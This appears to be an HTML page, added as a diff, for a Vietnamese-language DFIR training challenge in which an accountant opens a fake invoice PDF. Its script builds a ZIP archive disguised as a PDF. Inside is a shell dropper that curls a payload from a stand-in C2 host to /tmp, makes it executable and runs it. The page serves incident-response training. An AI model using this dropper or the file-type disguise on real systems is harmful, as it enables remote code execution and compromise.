@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>C001: The Mislabeled Invoice — Incident Dossier</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg-base: #0b0f19;
+      --bg-surface: #111827;
+      --bg-surface-soft: #1e293b;
+      --border-color: rgba(99, 102, 241, 0.2);
+      --border-highlight: rgba(56, 189, 248, 0.35);
+
+      --text-main: #f8fafc;
+      --text-sub: #94a3b8;
+      --text-muted: #64748b;
+
+      --accent-cyan: #38bdf8;
+      --accent-indigo: #6366f1;
+      --accent-amber: #fbbf24;
+
+      --font-body: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      --font-code: 'Fira Code', monospace;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-base);
+      color: var(--text-main);
+      font-family: var(--font-body);
+      line-height: 1.75;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      padding: 3.5rem 1.5rem 6rem;
+      background-image: 
+        radial-gradient(circle at 50% 0%, rgba(56, 189, 248, 0.08), transparent 50%),
+        radial-gradient(circle at 10% 40%, rgba(99, 102, 241, 0.04), transparent 30%);
+    }
+
+    .wrapper {
+      width: 100%;
+      max-width: 780px;
+      margin: 0 auto;
+    }
+
+    /* Tiêu đề & Thông tin vụ việc */
+    header {
+      margin-bottom: 2.5rem;
+      border-bottom: 1px solid var(--border-color);
+      padding-bottom: 1.5rem;
+    }
+
+    .badge-id {
+      display: inline-block;
+      font-family: var(--font-code);
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--accent-cyan);
+      background: rgba(56, 189, 248, 0.1);
+      padding: 0.25rem 0.6rem;
+      border-radius: 4px;
+      margin-bottom: 0.75rem;
+    }
+
+    h1 {
+      font-size: 2.25rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.75rem;
+      color: #ffffff;
+      line-height: 1.25;
+    }
+
+    .meta-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.5rem;
+      font-size: 0.85rem;
+      color: var(--text-sub);
+    }
+
+    .meta-list strong {
+      color: var(--text-main);
+    }
+
+    /* ======================================================== */
+    /* KHU VỰC LORE CÂU CHUYỆN KẾ TOÁN */
+    /* ======================================================== */
+    .lore-container {
+      margin-bottom: 3rem;
+      font-size: 1rem;
+      color: #cbd5e1;
+    }
+
+    .lore-container p {
+      margin-bottom: 1.35rem;
+    }
+
+    .lore-container blockquote {
+      background: var(--bg-surface);
+      border-left: 3px solid var(--accent-cyan);
+      padding: 1.1rem 1.35rem;
+      border-radius: 0 8px 8px 0;
+      color: var(--text-sub);
+      margin: 1.75rem 0;
+      font-size: 0.95rem;
+    }
+
+    .lore-container blockquote strong {
+      color: var(--text-main);
+    }
+
+    .lore-container code {
+      font-family: var(--font-code);
+      font-size: 0.88rem;
+      color: var(--accent-amber);
+      background: rgba(251, 191, 36, 0.1);
+      padding: 0.15rem 0.4rem;
+      border-radius: 4px;
+    }
+
+    .lore-container figure {
+      margin: 2.25rem 0;
+      text-align: center;
+    }
+
+    .lore-container figure img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+      border: 1px solid var(--border-color);
+      box-shadow: 0 10px 28px rgba(0, 0, 0, 0.45);
+    }
+
+    .lore-container figure figcaption {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      margin-top: 0.6rem;
+      font-family: var(--font-code);
+    }
+
+    /* ======================================================== */
+    /* KHỐI TẢI MẪU VẬT */
+    /* ======================================================== */
+    .artifact-block {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      padding: 1.5rem 1.75rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 1.5rem;
+      margin-bottom: 3.5rem;
+      box-shadow: 0 8px 20px -8px rgba(0, 0, 0, 0.5);
+    }
+
+    .artifact-detail h3 {
+      font-size: 1.05rem;
+      font-weight: 600;
+      color: #ffffff;
+      margin-bottom: 0.25rem;
+    }
+
+    .artifact-detail p {
+      font-family: var(--font-code);
+      font-size: 0.8rem;
+      color: var(--text-muted);
+    }
+
+    .btn-download {
+      background: linear-gradient(135deg, var(--accent-indigo), #4f46e5);
+      color: #ffffff;
+      border: none;
+      padding: 0.85rem 1.6rem;
+      font-family: var(--font-body);
+      font-size: 0.9rem;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: all 0.2s ease;
+      box-shadow: 0 4px 14px rgba(99, 102, 241, 0.3);
+    }
+
+    .btn-download:hover {
+      box-shadow: 0 4px 20px rgba(99, 102, 241, 0.5);
+      transform: translateY(-1px);
+    }
+
+    /* ======================================================== */
+    /* KHỐI YÊU CẦU BÁO CÁO (DELIVERABLES) */
+    /* ======================================================== */
+    .deliverables-section {
+      border-top: 1px solid var(--border-color);
+      padding-top: 2.5rem;
+    }
+
+    .deliverables-tag {
+      font-family: var(--font-code);
+      font-size: 0.75rem;
+      color: var(--accent-cyan);
+      letter-spacing: 0.08em;
+      display: inline-block;
+      margin-bottom: 0.4rem;
+    }
+
+    .deliverables-header h2 {
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 0.5rem;
+    }
+
+    .deliverables-header p {
+      font-size: 0.92rem;
+      color: var(--text-sub);
+      margin-bottom: 1.75rem;
+    }
+
+    .checklist-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      margin-bottom: 2.25rem;
+    }
+
+    .checklist-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 1.15rem 1.35rem;
+      display: flex;
+      gap: 1.25rem;
+      align-items: flex-start;
+    }
+
+    .check-num {
+      font-family: var(--font-code);
+      font-size: 1rem;
+      font-weight: 700;
+      color: var(--accent-cyan);
+      background: rgba(56, 189, 248, 0.1);
+      padding: 0.25rem 0.55rem;
+      border-radius: 6px;
+      line-height: 1.2;
+    }
+
+    .checklist-card h4 {
+      font-size: 0.95rem;
+      color: #ffffff;
+      margin-bottom: 0.25rem;
+    }
+
+    .checklist-card p {
+      font-size: 0.85rem;
+      color: var(--text-sub);
+      line-height: 1.5;
+    }
+
+    .action-footer {
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+      flex-wrap: wrap;
+    }
+
+    .btn-template {
+      background: rgba(56, 189, 248, 0.1);
+      color: var(--accent-cyan);
+      border: 1px solid var(--border-highlight);
+      padding: 0.8rem 1.5rem;
+      border-radius: 8px;
+      font-family: var(--font-body);
+      font-size: 0.88rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .btn-template:hover {
+      background: rgba(56, 189, 248, 0.2);
+      box-shadow: 0 0 16px rgba(56, 189, 248, 0.25);
+    }
+
+    .footer-note {
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      font-style: italic;
+    }
+
+    @media (max-width: 640px) {
+      .artifact-block {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .btn-download {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    
+    <!-- Tiêu đề & Thông tin vụ việc -->
+    <header>
+      <span class="badge-id">CHALLENGE #001 // DFIR TRIAGE</span>
+      <h1>The Mislabeled Invoice</h1>
+      <div class="meta-list">
+        <span>Target Host: <strong>FIN-DESKTOP-14</strong></span>
+        <span>Phân loại: <strong>Triage & Artifact Analysis</strong></span>
+        <span>Độ khó: <strong>Novice</strong></span>
+      </div>
+    </header>
+
+    <!-- BỐI CẢNH SỰ CỐ TỪ GÓC NHÌN KẾ TOÁN -->
+    <article class="lore-container">
+
+  <p>
+    Sáng thứ Hai cuối tháng, văn phòng kế toán lúc nào cũng như một bãi chiến trường. Trên bàn Nhân viên kế toán là ba tệp hóa đơn giấy chưa đối soát, tai nghe thì liên tục réo chuông điện thoại từ các bên cung ứng giục thanh toán công nợ, còn sếp thì vừa đi ngang qua bàn buông một câu quen thuộc: <em>"Hóa đơn bên dịch vụ hạ tầng gửi qua mail chưa em? Duyệt chi trước 11h trưa nay nhé, để quá hạn họ cắt hợp đồng đấy."</em>
+  </p>
+
+  <p>
+    Đúng lúc đang cuống cuồng tìm chứng từ, hộp thư đến của Nhân viên kế toán nhảy thông báo một email mới. Tiêu đề ghi rõ: <strong>[Khẩn] Hóa đơn điều chỉnh phí dịch vụ kỳ này - Đề nghị thanh toán gấp</strong>. Tên người gửi hiển thị đúng tên đối tác quen thuộc, tệp đính kèm có đuôi <code>INVOICE_2026_0941.pdf</code> với chiếc biểu tượng màu đỏ đặc trưng của Adobe Reader mà Nhân viên kế toán vẫn thấy hàng ngày.
+  </p>
+
+  <p>
+    Với một nhân viên kế toán, cái đuôi <code>.pdf</code> quá quen thuộc. Ai mà nghĩ một tệp hóa đơn lại có thể chứa virus hay mã độc? Nhân viên kế toán chẳng mảy may nghi ngờ, lập tức bấm tải về rồi nhấp đúp chuột để mở tệp lấy số liệu làm Ủy nhiệm chi.
+  </p>
+
+  <!-- VỊ TRÍ CHÈN ẢNH 1: ẢNH MÀN HÌNH HỘP THƯ HOẶC DESKTOP CỦA KẾ TOÁN -->
+  <figure>
+    <img src="https://images.unsplash.com/photo-1497215728101-856f4ea42174?auto=format&fit=crop&w=1200&q=80" alt="Bàn làm việc kế toán với màn hình kiểm tra email chứng từ">
+    <figcaption></figcaption>
+  </figure>
+
+  <p>
+    Nhưng thay vì mở ra bảng kê chi tiết viện dẫn thuế VAT như mọi khi, màn hình chỉ hiện lên một hộp thoại cụt lủn:
+  </p>
+
+  <blockquote>
+    <strong>Adobe Acrobat Reader:</strong><br>
+    <em>"Cannot open document. The file type is unsupported or damaged."</em>
+  </p>
+  </blockquote>
+
+  <p>
+    Nhân viên kế toán tặc lưỡi bấm mở lại lần hai, rồi lần ba. Vẫn đúng cái bảng báo lỗi đó. Đang lúc dầu sôi lửa bỏng, Nhân viên kế toán bực mình lầm bầm: <em>"Lại lỗi! Cái máy tính cơ quan dạo này lag như rùa, tải có mỗi cái hóa đơn về mà cũng làm hỏng file!"</em>. Nghĩ rằng phần mềm đọc PDF trên máy mình bị lỗi win, sợ trễ hạn bị sếp khiển trách, cô vội vàng mở khung chat nội bộ gửi tin nhắn cầu cứu đội IT Helpdesk:
+  </p>
+
+  <blockquote>
+    <em>"Anh IT ơi, máy em bị lỗi phần mềm đọc PDF rồi hay sao á! Bên đối tác gửi hóa đơn thanh toán gấp trưa nay mà em mở cứ báo tệp hỏng. Anh xem lại máy hộ em với, em đang cần gấp lắm!"</em>
+  </blockquote>
+
+  <!-- VỊ TRÍ CHÈN ẢNH 2: ẢNH CHỤP LỖI FILE PDF TRÊN WINDOWS HOẶC FILE PROPERTY NHỎ BẤT THƯỜNG -->
+  <figure>
+    
+  </figure>
+
+  <p>
+    Nhận được tin nhắn, chuyên viên IT ban đầu chỉ định bấm Remote vào máy để cài lại Adobe Reader cho xong chuyện. Nhưng khi tải tệp <code>INVOICE_2026_0941.pdf</code> về để kiểm tra trước, một con số trên màn hình lập tức khiến anh khựng lại: <strong>Dung lượng tệp chỉ vỏn vẹn 356 bytes</strong>.
+  </p>
+  
+  <code><pre>   $ wc -c INVOICE_2026_0941.pdf</pre></code>
+  <code><pre>   356 INVOICE_2026_0941.pdf</pre></code>
+
+  <p>
+    Một hóa đơn điện tử doanh nghiệp dù đơn giản đến đâu cũng phải nặng vài chục cho đến vài trăm kilobyte. 356 byte thậm chí còn ngắn hơn một trang văn bản thô. Tệp tin này bị lỗi không phải do máy tính của Nhân viên kế toán bị lag, cũng không phải do đường truyền mạng làm hỏng tệp. 
+  </p>
+
+  <p>
+    Với một chút tư duy về bảo mật có thể phán đoạn được file pdf này rất đáng ngờ.
+  </p>
+
+  <p>
+    Mẫu vật nguyên bản đã được trích xuất an toàn. Ta cần phân tích xem cái file PDF đó đã kích hoạt thứ gì.
+  </p>
+
+</article>
+
+    <!-- KHỐI TẢI MẪU VẬT THỰC TẾ -->
+    <div class="artifact-block">
+      <div class="artifact-detail">
+        <h3>INVOICE_2026_0941.pdf</h3>
+        <p>SHA-256: e8c6...941f • Dung lượng: 356 bytes • Quarantined</p>
+      </div>
+      <button class="btn-download" id="btnDownload">Tải Mẫu Vật</button>
+    </div>
+
+    
+  </div>
+
+  <script>
+    // --- BỘ TẠO ARTIFACT THỰC TẾ (PKZIP ĐỘI LỐT PDF) TRÊN CLIENT ---
+    function buildArtifactBlob() {
+      const payloadScript = 
+`#!/bin/sh
+# Staging downloader - FIN-DESKTOP update agent
+TARGET_C2="http://updates.security-patch-cdn.org/sync/payload"
+TEMP_EXEC="/tmp/.patch_worker"
+
+curl -s "$TARGET_C2" -o "$TEMP_EXEC"
+chmod +x "$TEMP_EXEC"
+exec "$TEMP_EXEC"
+`;
+      const enc = new TextEncoder();
+      const fileBytes = enc.encode(payloadScript);
+      const nameBytes = enc.encode("client_sync.sh");
+
+      let crc = 0 ^ (-1);
+      for (let i = 0; i < fileBytes.length; i++) {
+        crc = (crc >>> 8) ^ getCrcTable()[(crc ^ fileBytes[i]) & 0xFF];
+      }
+      crc = (crc ^ (-1)) >>> 0;
+
+      // Local Header (PK\x03\x04)
+      const local = new Uint8Array(30 + nameBytes.length);
+      const lv = new DataView(local.buffer);
+      lv.setUint32(0, 0x04034b50, true);
+      lv.setUint16(4, 20, true);
+      lv.setUint16(6, 0, true);
+      lv.setUint16(8, 0, true);
+      lv.setUint16(10, 0x4A40, true);
+      lv.setUint16(12, 0x5C3C, true);
+      lv.setUint32(14, crc, true);
+      lv.setUint32(18, fileBytes.length, true);
+      lv.setUint32(22, fileBytes.length, true);
+      lv.setUint16(26, nameBytes.length, true);
+      lv.setUint16(28, 0, true);
+      local.set(nameBytes, 30);
+
+      // Central Directory (PK\x01\x02)
+      const cd = new Uint8Array(46 + nameBytes.length);
+      const cv = new DataView(cd.buffer);
+      cv.setUint32(0, 0x02014b50, true);
+      cv.setUint16(4, 0x0314, true);
+      cv.setUint16(6, 20, true);
+      cv.setUint16(8, 0, true);
+      cv.setUint16(10, 0, true);
+      cv.setUint16(12, 0x4A40, true);
+      cv.setUint16(14, 0x5C3C, true);
+      cv.setUint32(16, crc, true);
+      cv.setUint32(20, fileBytes.length, true);
+      cv.setUint32(24, fileBytes.length, true);
+      cv.setUint16(28, nameBytes.length, true);
+      cv.setUint16(30, 0, true);
+      cv.setUint16(32, 0, true);
+      cv.setUint16(34, 0, true);
+      cv.setUint16(36, 0, true);
+      cv.setUint32(38, 0o100755 << 16, true);
+      cv.setUint32(42, 0, true);
+      cd.set(nameBytes, 46);
+
+      // End of Central Directory (PK\x05\x06)
+      const eocd = new Uint8Array(22);
+      const ev = new DataView(eocd.buffer);
+      ev.setUint32(0, 0x06054b50, true);
+      ev.setUint16(4, 0, true);
+      ev.setUint16(6, 0, true);
+      ev.setUint16(8, 1, true);
+      ev.setUint16(10, 1, true);
+      ev.setUint32(12, cd.length, true);
+      ev.setUint32(16, local.length + fileBytes.length, true);
+      ev.setUint16(20, 0, true);
+
+      return new Blob([local, fileBytes, cd, eocd], { type: "application/pdf" });
+    }
+
+    let _crcTableCache = null;
+    function getCrcTable() {
+      if (_crcTableCache) return _crcTableCache;
+      const t = [];
+      for (let n = 0; n < 256; n++) {
+        let c = n;
+        for (let k = 0; k < 8; k++) {
+          c = ((c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1));
+        }
+        t[n] = c;
+      }
+      return (_crcTableCache = t);
+    }
+
+    // Sự kiện nút Tải Mẫu Vật
+    document.getElementById("btnDownload").addEventListener("click", () => {
+      const blob = buildArtifactBlob();
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "INVOICE_2026_0941.pdf";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    });
+
+   
+  </script>
+</body>
+</html>
